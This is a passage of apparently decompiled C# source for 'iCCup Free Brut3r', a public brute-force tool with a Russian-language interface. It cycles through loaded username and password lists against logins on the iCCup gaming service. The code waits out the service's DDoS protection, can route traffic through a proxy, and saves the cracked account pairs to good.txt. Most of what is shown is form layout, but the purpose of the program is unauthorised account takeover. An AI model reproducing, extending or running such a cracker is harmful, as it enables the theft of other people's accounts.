                                    empty += "4";
                                string path = "good.txt";
                                bool flag2 = false;
                                if (!System.IO.File.Exists(path))
                                    System.IO.File.Create(path).Close();
                                List<string> stringList = new List<string>((IEnumerable<string>)System.IO.File.ReadAllLines(path));
                                foreach (string str3 in goodlist)
                                {
                                    if (username.ToLower() == str3.ToLower())
                                        flag2 = true;
                                }
                                if (str1 == password || str2 == username)
                                    flag2 = true;
                                str1 = password;
                                str2 = username;
                                if (!flag2)
                                {
                                    int index2 = 0;
                                    while (index2 < AbsolBruter.GlobalVars.BruteBase.Count)
                                    {
                                        if (AbsolBruter.GlobalVars.BruteBase[index2].username == username)
                                            AbsolBruter.GlobalVars.BruteBase[index2] = new AbsolBruter.GlobalVars.BruteBaseStruct(username, password, true);
                                         { ++index2; }
                                    }
                                }
                                if (flag2)
                                {
                                    AddLogBoxItem("Возможный ник :" + username + ", Пароль:" + password + ".");
                                    AddLogBoxItem("Возможно нужен рестарт, 8 сек...");
                                    Thread.Sleep(7000);
                                    checkbuttonneedenable = false;
                                    str1 = "";
                                    str2 = "";
                                    SetLoginAndStartLatency();
                                }
                                else
                                    goodlist.Add(username);
                                stringList.Add(username + ";" + password + (flag1 ? " ->не доступен?!" : ""));
                                System.IO.File.WriteAllLines(path, stringList.ToArray());
                                AddLogBoxItem("\r Найден акк! Ник:" + username + ", Пароль:" + password + ". Метод обнаружения:" + empty);
                            }
                            else
                            {
                                AddLogBoxItem("Сработала защита от ддоса#2");
                                AddLogBoxItem("ждем 20 сек");
                                Thread.Sleep(20000);
                                checkbuttonneedenable = false;
                                SetLoginAndStartLatency();
                                continue;
                            }
                        }
                        catch (Exception ex)
                        {
                            AddLogBoxItem("Непонятная ошибка, жду 10 сек.");
                            AddLogBoxItem(ex.Message);
                            Thread.Sleep(10000);
                            checkbuttonneedenable = false;
                            SetLoginAndStartLatency();
                            continue;
                        }
                    label_58:
                        AbsolBruter.GlobalVars.BruteBase[index1] = new AbsolBruter.GlobalVars.BruteBaseStruct(username, password, true);
                        break;
                    }
                }
                 { ++index1; }
            }
            working = false;
        }

        public void StartButton_Click(object sender, EventArgs e)
        {
            if (loggedin && IsAllOkay())
            {
                if (!working)
                {
                    new Thread(new ThreadStart(SingleThreadBruter)).Start();
                    AddLogBoxItem("Брут запущен!");
                    AddLogBoxItem("В один поток.");
                    CurTryCount = 0;
                    CurCount = 0;
                }
                else
                    AddLogBoxItem("Брут уже запущен!!");
            }
            else
                AddLogBoxItem("Введите рабочий логин!!!");
        }

        public void PauseButton_Click(object sender, EventArgs e)
        {
            pause = !pause;
            if (pause)
                AddLogBoxItem("Включена пауза!");
            else
                AddLogBoxItem("Пауза отключена!");
        }

        public void AddProxyBtn_Click(object sender, EventArgs e)
        {
        }

        public void BruteUsername_TextChanged(object sender, EventArgs e)
        {
            System.IO.File.WriteAllText("lastlogin.txt", BruteUsername.Text);
        }

        public void BrutePassword_TextChanged(object sender, EventArgs e)
        {
            System.IO.File.WriteAllText("lastpwd.txt", BrutePassword.Text);
        }

        public void MyProxy_TextChanged(object sender, EventArgs e)
        {
            if (MyProxy.Text == "127.0.0.1")
            {
                proxy = new WebProxy();
            }
            else
            {
                try
                {
                    proxy = new WebProxy(new Uri("https:\\\\" + MyProxy.Text), true);
                }
                catch (Exception ex)
                {
                    AddLogBoxItem("Error:" + ex.Message);
                    proxy = new WebProxy();
                }
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
                components.Dispose();
            base.Dispose(disposing);
        }

        public void InitializeComponent()
        {
            components = (IContainer)new Container();
            ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AbsolBruter));
            PokePictBox = new PictureBox();
            PokeGoTimer = new System.Windows.Forms.Timer(components);
            ExitButton = new PictureBox();
            TrayButton = new PictureBox();
            BruteUsername = new TextBox();
            BrutePassword = new TextBox();
            CheckButton = new PictureBox();
            label1 = new Label();
            label2 = new Label();
            label3 = new Label();
            SwapMode = new PictureBox();
            UsernamesForBrute = new Button();
            PasswordForBrute = new Button();
            SwapLoginTypeTimer = new System.Windows.Forms.Timer(components);
            SeparatorLP = new TextBox();
            LabelM1 = new Label();
            LoadNickPwdSeperated = new Button();
            LabelM3 = new Label();
            LabelM2 = new Label();
            label4 = new Label();
            label6 = new Label();
            UsersCount = new Label();
            BaseLoaded = new PictureBox();
            LoginIccupGetted = new PictureBox();
            RunnedBrute = new PictureBox();
            label7 = new Label();
            label8 = new Label();
            label9 = new Label();
            label10 = new Label();
            PcEnd = new Label();
            PauseButton = new Button();
            StartButton = new Button();
            BruTray = new NotifyIcon(components);
            MyProxy = new TextBox();
            LogMyBox = new FuckListBox();
            ((ISupportInitialize)PokePictBox).BeginInit();
            ((ISupportInitialize)ExitButton).BeginInit();
            ((ISupportInitialize)TrayButton).BeginInit();
            ((ISupportInitialize)CheckButton).BeginInit();
            ((ISupportInitialize)SwapMode).BeginInit();
            ((ISupportInitialize)BaseLoaded).BeginInit();
            ((ISupportInitialize)LoginIccupGetted).BeginInit();
            ((ISupportInitialize)RunnedBrute).BeginInit();
            SuspendLayout();
            PokePictBox.BackColor = Color.Transparent;
            PokePictBox.Image = (Image)AllResources.PokeLine;
            PokePictBox.Location = new Point(0, 560);
            PokePictBox.Name = "PokePictBox";
            PokePictBox.Size = new Size(400, 40);
            PokePictBox.TabIndex = 0;
            PokePictBox.TabStop = false;
            PokeGoTimer.Enabled = true;
            PokeGoTimer.Interval = 50;
            PokeGoTimer.Tick += new EventHandler(PokeGoTimer_Tick);
            ExitButton.BackColor = Color.Transparent;
            ExitButton.BackgroundImage = (Image)AllResources.ExitButton;
            ExitButton.BackgroundImageLayout = ImageLayout.None;
            ExitButton.Location = new Point(339, 12);
            ExitButton.Name = "ExitButton";
            ExitButton.Size = new Size(61, 55);
            ExitButton.TabIndex = 1;
            ExitButton.TabStop = false;
            ExitButton.Click += new EventHandler(ExitButton_Click);
            ExitButton.MouseDown += new MouseEventHandler(ExitButton_MouseDown);
            ExitButton.MouseEnter += new EventHandler(ExitButton_MouseEnter);
            ExitButton.MouseLeave += new EventHandler(ExitButton_MouseLeave);
            ExitButton.MouseUp += new MouseEventHandler(ExitButton_MouseUp);
            TrayButton.BackColor = Color.Transparent;
            TrayButton.BackgroundImage = (Image)AllResources.TrayBtn;
            TrayButton.BackgroundImageLayout = ImageLayout.None;
            TrayButton.Location = new Point(269, 7);
            TrayButton.Name = "TrayButton";
            TrayButton.Size = new Size(66, 59);
            TrayButton.TabIndex = 1;
            TrayButton.TabStop = false;
            TrayButton.Click += new EventHandler(TrayButton_Click);
            TrayButton.MouseDown += new MouseEventHandler(TrayButton_MouseDown);
            TrayButton.MouseEnter += new EventHandler(TrayButton_MouseEnter);
            TrayButton.MouseLeave += new EventHandler(TrayButton_MouseLeave);
            TrayButton.MouseUp += new MouseEventHandler(TrayButton_MouseUp);
            BruteUsername.BackColor = Color.DimGray;
            BruteUsername.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            BruteUsername.ForeColor = SystemColors.Menu;
            BruteUsername.Location = new Point(126, 116);
            BruteUsername.Name = "BruteUsername";
            BruteUsername.Size = new Size(199, 27);
            BruteUsername.TabIndex = 1;
            BruteUsername.TextChanged += new EventHandler(BruteUsername_TextChanged);
            BrutePassword.BackColor = Color.DimGray;
            BrutePassword.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            BrutePassword.ForeColor = SystemColors.Menu;
            BrutePassword.Location = new Point(126, 158);
            BrutePassword.Name = "BrutePassword";
            BrutePassword.Size = new Size(199, 27);
            BrutePassword.TabIndex = 2;
            BrutePassword.TextChanged += new EventHandler(BrutePassword_TextChanged);
            CheckButton.BackColor = Color.Transparent;
            CheckButton.BackgroundImage = (Image)AllResources.CheckBtn;
            CheckButton.BackgroundImageLayout = ImageLayout.None;
            CheckButton.Location = new Point(158, 190);
            CheckButton.Name = "CheckButton";
            CheckButton.Size = new Size(145, 40);
            CheckButton.TabIndex = 3;
            CheckButton.TabStop = false;
            CheckButton.Click += new EventHandler(CheckButton_Click);
            CheckButton.MouseDown += new MouseEventHandler(CheckButton_MouseDown);
            CheckButton.MouseEnter += new EventHandler(CheckButton_MouseEnter);
            CheckButton.MouseLeave += new EventHandler(CheckButton_MouseLeave);
            CheckButton.MouseUp += new MouseEventHandler(CheckButton_MouseUp);
            label1.AutoSize = true;
            label1.BackColor = Color.Transparent;
            label1.Font = new Font("Microsoft Sans Serif", 14f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            label1.Location = new Point(30, 138);
            label1.Name = "label1";
            label1.Size = new Size(69, 24);
            label1.TabIndex = 4;
            label1.Text = "Логин:";
            label2.AutoSize = true;
            label2.BackColor = Color.Transparent;
            label2.Location = new Point(113, 90);
            label2.Name = "label2";
            label2.Size = new Size(228, 13);
            label2.TabIndex = 5;
            label2.Text = "Сюда нужно вставить любой логин iCCUp'а.";
            label3.AutoSize = true;
            label3.BackColor = Color.Transparent;
            label3.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            label3.Location = new Point(24, 239);
            label3.Name = "label3";
            label3.Size = new Size(358, 13);
            label3.TabIndex = 6;
            label3.Text = "Теперь нужно выбрать метод загрузки логинов и паролей";
            SwapMode.BackColor = Color.Transparent;
            SwapMode.BackgroundImage = (Image)AllResources.MegoCheckBoxFirstpart;
            SwapMode.BackgroundImageLayout = ImageLayout.Center;
            SwapMode.Location = new Point(126, 263);
            SwapMode.Name = "SwapMode";
            SwapMode.Size = new Size(197, 78);
            SwapMode.TabIndex = 7;
            SwapMode.TabStop = false;
            SwapMode.Click += new EventHandler(SwapMode_Click);
            SwapMode.DragEnter += new DragEventHandler(SwapMode_DragEnter);
            SwapMode.MouseDown += new MouseEventHandler(SwapMode_MouseDown);
            SwapMode.MouseEnter += new EventHandler(SwapMode_MouseEnter);
            SwapMode.MouseLeave += new EventHandler(SwapMode_MouseLeave);
            SwapMode.MouseMove += new MouseEventHandler(SwapMode_MouseMove);
            SwapMode.MouseUp += new MouseEventHandler(SwapMode_MouseUp);
            UsernamesForBrute.BackColor = Color.DimGray;
            UsernamesForBrute.BackgroundImage = (Image)AllResources.EditBox_;
            UsernamesForBrute.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            UsernamesForBrute.ForeColor = SystemColors.ButtonFace;
            UsernamesForBrute.Location = new Point(11, 265);
            UsernamesForBrute.Name = "UsernamesForBrute";
            UsernamesForBrute.Size = new Size(109, 27);
            UsernamesForBrute.TabIndex = 3;
            UsernamesForBrute.Text = "Ники";
            UsernamesForBrute.UseVisualStyleBackColor = false;
            UsernamesForBrute.Click += new EventHandler(UsernamesForBrute_Click);
            PasswordForBrute.BackColor = Color.DimGray;
            PasswordForBrute.BackgroundImage = (Image)AllResources.EditBox_;
            PasswordForBrute.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            PasswordForBrute.ForeColor = SystemColors.ButtonFace;
            PasswordForBrute.Location = new Point(12, 314);
            PasswordForBrute.Name = "PasswordForBrute";
            PasswordForBrute.Size = new Size(109, 27);
            PasswordForBrute.TabIndex = 4;
            PasswordForBrute.Text = "Пароли";
            PasswordForBrute.UseVisualStyleBackColor = false;
            PasswordForBrute.Click += new EventHandler(PasswordForBrute_Click);
            SwapLoginTypeTimer.Enabled = true;
            SwapLoginTypeTimer.Interval = 200;
            SwapLoginTypeTimer.Tick += new EventHandler(SwapLoginTypeTimer_Tick);
            SeparatorLP.BackColor = Color.DimGray;
            SeparatorLP.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            SeparatorLP.ForeColor = SystemColors.Menu;
            SeparatorLP.Location = new Point(38, 280);
            SeparatorLP.Name = "SeparatorLP";
            SeparatorLP.Size = new Size(46, 27);
            SeparatorLP.TabIndex = 5;
            SeparatorLP.Text = ";";
            SeparatorLP.TextAlign = HorizontalAlignment.Center;
            SeparatorLP.Visible = false;
            LabelM1.AutoSize = true;
            LabelM1.BackColor = Color.Transparent;
            LabelM1.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            LabelM1.Location = new Point(8, 260);
            LabelM1.Name = "LabelM1";
            LabelM1.Size = new Size(105, 17);
            LabelM1.TabIndex = 9;
            LabelM1.Text = "Разделитель";
            LabelM1.Visible = false;
            LoadNickPwdSeperated.BackColor = Color.DimGray;
            LoadNickPwdSeperated.BackgroundImage = (Image)AllResources.EditBox_;
            LoadNickPwdSeperated.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            LoadNickPwdSeperated.ForeColor = SystemColors.ButtonFace;
            LoadNickPwdSeperated.Location = new Point(11, 314);
            LoadNickPwdSeperated.Name = "LoadNickPwdSeperated";
            LoadNickPwdSeperated.Size = new Size(109, 27);
            LoadNickPwdSeperated.TabIndex = 6;
            LoadNickPwdSeperated.Text = "Открыть файл";
            LoadNickPwdSeperated.UseVisualStyleBackColor = false;
            LoadNickPwdSeperated.Visible = false;
            LoadNickPwdSeperated.Click += new EventHandler(LoadNickPwdSeperated_Click);
            LabelM3.AutoSize = true;
            LabelM3.BackColor = Color.Transparent;
            LabelM3.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            LabelM3.Location = new Point(90, 286);
            LabelM3.Name = "LabelM3";
            LabelM3.Size = new Size(26, 17);
            LabelM3.TabIndex = 9;
            LabelM3.Text = "——";
            LabelM3.Visible = false;
            LabelM2.AutoSize = true;
            LabelM2.BackColor = Color.Transparent;
            LabelM2.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            LabelM2.Location = new Point(6, 286);
            LabelM2.Name = "LabelM2";
            LabelM2.Size = new Size(26, 17);
            LabelM2.TabIndex = 9;
            LabelM2.Text = "——";
            LabelM2.Visible = false;
            label4.AutoSize = true;
            label4.BackColor = Color.Transparent;
            label4.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            label4.Location = new Point(15, 58);
            label4.Name = "label4";
            label4.Size = new Size(44, 17);
            label4.TabIndex = 11;
            label4.Text = "БАЗА";
            label6.AutoSize = true;
            label6.BackColor = Color.Transparent;
            label6.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            label6.Location = new Point(24, 344);
            label6.Name = "label6";
            label6.Size = new Size(60, 17);
            label6.TabIndex = 11;
            label6.Text = "Прокси:";
            UsersCount.AutoSize = true;
            UsersCount.BackColor = Color.Transparent;
            UsersCount.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            UsersCount.Location = new Point(224, 352);
            UsersCount.Name = "UsersCount";
            UsersCount.Size = new Size(16, 17);
            UsersCount.TabIndex = 11;
            UsersCount.Text = "0";
            BaseLoaded.BackColor = Color.Transparent;
            BaseLoaded.BackgroundImage = (Image)AllResources.Bad;
            BaseLoaded.BackgroundImageLayout = ImageLayout.None;
            BaseLoaded.Location = new Point(12, 12);
            BaseLoaded.Name = "BaseLoaded";
            BaseLoaded.Size = new Size(52, 48);
            BaseLoaded.TabIndex = 13;
            BaseLoaded.TabStop = false;
            LoginIccupGetted.BackColor = Color.Transparent;
            LoginIccupGetted.BackgroundImage = (Image)AllResources.Bad;
            LoginIccupGetted.BackgroundImageLayout = ImageLayout.None;
            LoginIccupGetted.Location = new Point(93, 12);
            LoginIccupGetted.Name = "LoginIccupGetted";
            LoginIccupGetted.Size = new Size(52, 48);
            LoginIccupGetted.TabIndex = 13;
            LoginIccupGetted.TabStop = false;
            RunnedBrute.BackColor = Color.Transparent;
            RunnedBrute.BackgroundImage = (Image)AllResources.Bad;
            RunnedBrute.BackgroundImageLayout = ImageLayout.None;
            RunnedBrute.Location = new Point(171, 12);
            RunnedBrute.Name = "RunnedBrute";
            RunnedBrute.Size = new Size(52, 48);
            RunnedBrute.TabIndex = 13;
            RunnedBrute.TabStop = false;
            label7.AutoSize = true;
            label7.BackColor = Color.Transparent;
            label7.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            label7.Location = new Point(91, 58);
            label7.Name = "label7";
            label7.Size = new Size(57, 17);
            label7.TabIndex = 11;
            label7.Text = "ЛОГИН";
            label8.AutoSize = true;
            label8.BackColor = Color.Transparent;
            label8.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            label8.Location = new Point(172, 59);
            label8.Name = "label8";
            label8.Size = new Size(53, 17);
            label8.TabIndex = 11;
            label8.Text = "СТАРТ";
            label9.AutoSize = true;
            label9.BackColor = Color.Transparent;
            label9.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            label9.Location = new Point(155, 352);
            label9.Name = "label9";
            label9.Size = new Size(66, 17);
            label9.TabIndex = 11;
            label9.Text = "Логинов:";
            label10.AutoSize = true;
            label10.BackColor = Color.Transparent;
            label10.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Regular, GraphicsUnit.Point, (byte)204);
            label10.Location = new Point(133, 535);
            label10.Name = "label10";
            label10.Size = new Size(87, 17);
            label10.TabIndex = 11;
            label10.Text = "Завершено:";
            PcEnd.AutoSize = true;
            PcEnd.BackColor = Color.Transparent;
            PcEnd.Font = new Font("Microsoft Sans Serif", 10f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            PcEnd.Location = new Point(217, 535);
            PcEnd.Name = "PcEnd";
            PcEnd.Size = new Size(30, 17);
            PcEnd.TabIndex = 11;
            PcEnd.Text = "0%";
            PauseButton.BackColor = Color.DimGray;
            PauseButton.BackgroundImage = (Image)AllResources.EditBox_;
            PauseButton.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            PauseButton.ForeColor = SystemColors.ButtonFace;
            PauseButton.Location = new Point(18, 530);
            PauseButton.Name = "PauseButton";
            PauseButton.Size = new Size(109, 27);
            PauseButton.TabIndex = 8;
            PauseButton.Text = "Пауза";
            PauseButton.UseVisualStyleBackColor = false;
            PauseButton.Click += new EventHandler(PauseButton_Click);
            StartButton.BackColor = Color.DimGray;
            StartButton.BackgroundImage = (Image)AllResources.EditBox_;
            StartButton.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            StartButton.ForeColor = SystemColors.ButtonFace;
            StartButton.Location = new Point(268, 530);
            StartButton.Name = "StartButton";
            StartButton.Size = new Size(109, 27);
            StartButton.TabIndex = 9;
            StartButton.Text = "Старт";
            StartButton.UseVisualStyleBackColor = false;
            StartButton.Click += new EventHandler(StartButton_Click);
            BruTray.BalloonTipText = "Free bruteforcer for iCCup!";
            BruTray.BalloonTipTitle = "iCCup Bruteforce";
            BruTray.Icon = (Icon)AllResources.BruTray;
            BruTray.Text = "iCCup public Bruteforcer";
            BruTray.Visible = true;
            BruTray.MouseDoubleClick += new MouseEventHandler(BruTray_MouseDoubleClick);
            MyProxy.BackColor = Color.DimGray;
            MyProxy.Font = new Font("Times New Roman", 13f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            MyProxy.ForeColor = SystemColors.Menu;
            MyProxy.Location = new Point(12, 364);
            MyProxy.Name = "MyProxy";
            MyProxy.Size = new Size((int)sbyte.MaxValue, 27);
            MyProxy.TabIndex = 5;
            MyProxy.Text = "127.0.0.1";
            MyProxy.TextAlign = HorizontalAlignment.Center;
            MyProxy.TextChanged += new EventHandler(MyProxy_TextChanged);
            LogMyBox.BackColor = Color.Transparent;
            LogMyBox.DrawMode = DrawMode.OwnerDrawVariable;
            LogMyBox.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte)204);
            LogMyBox.ForeColor = SystemColors.Menu;
            LogMyBox.FormattingEnabled = true;
            LogMyBox.ItemHeight = 15;
            LogMyBox.Items.AddRange(new object[5]
            {
        (object) " ",
        (object) "  iCCup BruteForce by Absol(d3scene.ru) ",
        (object) "   Free for public lvl2.",
        (object) " ",
        (object) " "
            });
            LogMyBox.Location = new Point(12, 390);
            LogMyBox.Name = "LogMyBox";
            LogMyBox.Size = new Size(370, 134);
            LogMyBox.TabIndex = 10;
            AutoScaleDimensions = new SizeF(6f, 13f);
            AutoScaleMode = AutoScaleMode.Font;
            BackgroundImage = (Image)AllResources.MainForm;
            BackgroundImageLayout = ImageLayout.None;
            ClientSize = new Size(400, 600);
            Controls.Add((Control)LabelM1);
            Controls.Add((Control)RunnedBrute);
            Controls.Add((Control)LoginIccupGetted);
            Controls.Add((Control)BaseLoaded);
            Controls.Add((Control)LogMyBox);
            Controls.Add((Control)label9);
            Controls.Add((Control)label6);
            Controls.Add((Control)PcEnd);
            Controls.Add((Control)UsersCount);
            Controls.Add((Control)label10);
            Controls.Add((Control)label8);
            Controls.Add((Control)label7);
            Controls.Add((Control)label4);
            Controls.Add((Control)LabelM2);
            Controls.Add((Control)LabelM3);
            Controls.Add((Control)StartButton);
            Controls.Add((Control)PauseButton);
            Controls.Add((Control)SwapMode);
            Controls.Add((Control)label3);
            Controls.Add((Control)label2);
            Controls.Add((Control)label1);
            Controls.Add((Control)CheckButton);
            Controls.Add((Control)BrutePassword);
            Controls.Add((Control)BruteUsername);
            Controls.Add((Control)TrayButton);
            Controls.Add((Control)ExitButton);
            Controls.Add((Control)PokePictBox);
            Controls.Add((Control)LoadNickPwdSeperated);
            Controls.Add((Control)MyProxy);
            Controls.Add((Control)SeparatorLP);
            Controls.Add((Control)UsernamesForBrute);
            Controls.Add((Control)PasswordForBrute);
            FormBorderStyle = FormBorderStyle.None;
            Icon = (Icon)AllResources.Icon;
            Name = "AbsolFreeBrut3Force";
            StartPosition = FormStartPosition.CenterScreen;
            Text = "iCCup Free Brut3r";
            Load += new EventHandler(AbsolFreeBrut3Force_Load);
            Resize += new EventHandler(AbsolFreeBrut3Force_Resize);
            ((ISupportInitialize)PokePictBox).EndInit();
            ((ISupportInitialize)ExitButton).EndInit();
            ((ISupportInitialize)TrayButton).EndInit();
            ((ISupportInitialize)CheckButton).EndInit();
            ((ISupportInitialize)SwapMode).EndInit();
            ((ISupportInitialize)BaseLoaded).EndInit();
            ((ISupportInitialize)LoginIccupGetted).EndInit();
            ((ISupportInitialize)RunnedBrute).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }

        public class GlobalVars
        {
            public static List<AbsolBruter.GlobalVars.BruteBaseStruct> BruteBase;

            public GlobalVars()
            {

            }

            static GlobalVars()
            {
                AbsolBruter.GlobalVars.BruteBase = new List<AbsolBruter.GlobalVars.BruteBaseStruct>();
            }

            public struct BruteBaseStruct
            {
                public string username;
                public string password;
                public bool Requested;

                public BruteBaseStruct(string username, string password, bool requested = false)
                {
                    this.username = username;
                    this.password = password;
                    Requested = requested;
                }
            }
        }
    }
}
